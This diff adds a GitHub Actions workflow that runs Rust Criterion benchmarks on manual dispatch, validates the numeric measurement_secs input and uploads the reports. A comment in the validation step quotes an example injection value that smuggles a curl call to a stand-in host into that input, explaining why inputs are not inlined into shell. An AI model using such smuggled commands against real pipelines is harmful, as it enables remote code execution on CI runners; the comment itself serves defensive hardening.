@@ -1,0 +1,128 @@
+name: Perf Baseline (manual)
+
+# T16 (2026-05-15): manual-dispatch only — perf runs are noisy on shared
+# GHA runners, so we don't run on every push or PR. To take a fresh
+# baseline, open the Actions tab -> "Perf Baseline (manual)" -> "Run workflow".
+
+on:
+  workflow_dispatch:
+    inputs:
+      measurement_secs:
+        description: "Criterion measurement window per bench (seconds)"
+        required: false
+        default: "3"
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  bench:
+    name: Run weekend-push baselines
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: dtolnay/rust-toolchain@stable
+
+      - uses: Swatinem/rust-cache@v2
+        with:
+          workspaces: core -> target
+          shared-key: "perf-baseline"
+
+      - name: Install Linux dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y libssl-dev
+
+      - name: Show toolchain + host
+        run: |
+          rustc --version
+          uname -a
+          nproc
+          cat /proc/cpuinfo | grep -m1 "model name"
+
+      # C12 / T81 (V11 H-2): validate workflow_dispatch input once, then
+      # propagate the sanitized value via env vars instead of inlining
+      # `${{ github.event.inputs.* }}` into shell — that direct
+      # interpolation is a command-injection sink (an attacker who can
+      # trigger workflow_dispatch via API/webhook could smuggle
+      # `"; curl evil.sh; #` into measurement_secs).
+      - name: Validate measurement_secs input
+        env:
+          MEASUREMENT_SECS_RAW: ${{ github.event.inputs.measurement_secs }}
+        run: |
+          set -euo pipefail
+          VALUE="${MEASUREMENT_SECS_RAW:-3}"
+          if ! [[ "$VALUE" =~ ^[0-9]+$ ]]; then
+            echo "::error::measurement_secs must be a positive integer (got: $VALUE)"
+            exit 1
+          fi
+          # Sanity: reject zero and absurdly long runs (>10min/bench).
+          if [ "$VALUE" -lt 1 ] || [ "$VALUE" -gt 600 ]; then
+            echo "::error::measurement_secs must be between 1 and 600 (got: $VALUE)"
+            exit 1
+          fi
+          echo "MEASUREMENT_SECS=$VALUE" >> "$GITHUB_ENV"
+
+      # Each bench is invoked separately so a failure in one doesn't mask
+      # the others. `tee` captures stdout so the summary step can grep.
+      - name: bench - anthropic_cache
+        working-directory: core
+        run: |
+          cargo bench --bench anthropic_cache -- \
+            --warm-up-time 1 --measurement-time "$MEASUREMENT_SECS" \
+            2>&1 | tee ../target-bench-anthropic.txt
+
+      - name: bench - fts5_memory_insert
+        working-directory: core
+        run: |
+          cargo bench --bench fts5_memory_insert --features experimental-hermes-memory -- \
+            --warm-up-time 1 --measurement-time "$MEASUREMENT_SECS" \
+            2>&1 | tee ../target-bench-fts5-insert.txt
+
+      - name: bench - fts5_memory_query
+        working-directory: core
+        run: |
+          cargo bench --bench fts5_memory_query --features experimental-hermes-memory -- \
+            --warm-up-time 1 --measurement-time "$MEASUREMENT_SECS" \
+            2>&1 | tee ../target-bench-fts5-query.txt
+
+      - name: bench - hermes_tool_lookup
+        working-directory: core
+        run: |
+          cargo bench --bench hermes_tool_lookup --features experimental-hermes-tools -- \
+            --warm-up-time 1 --measurement-time "$MEASUREMENT_SECS" \
+            2>&1 | tee ../target-bench-lookup.txt
+
+      - name: bench - hermes_tool_dispatch
+        working-directory: core
+        run: |
+          cargo bench --bench hermes_tool_dispatch --features experimental-hermes-tools -- \
+            --warm-up-time 1 --measurement-time "$MEASUREMENT_SECS" \
+            2>&1 | tee ../target-bench-dispatch.txt
+
+      - name: Summarise headline timings
+        if: always()
+        run: |
+          {
+            echo "## Headline timings"
+            echo '```'
+            grep -h "time:" target-bench-*.txt || true
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Upload Criterion HTML + JSON
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: criterion-reports-${{ github.run_id }}
+          path: |
+            core/target/criterion/**
+            target-bench-*.txt
+          if-no-files-found: warn
+          retention-days: 30
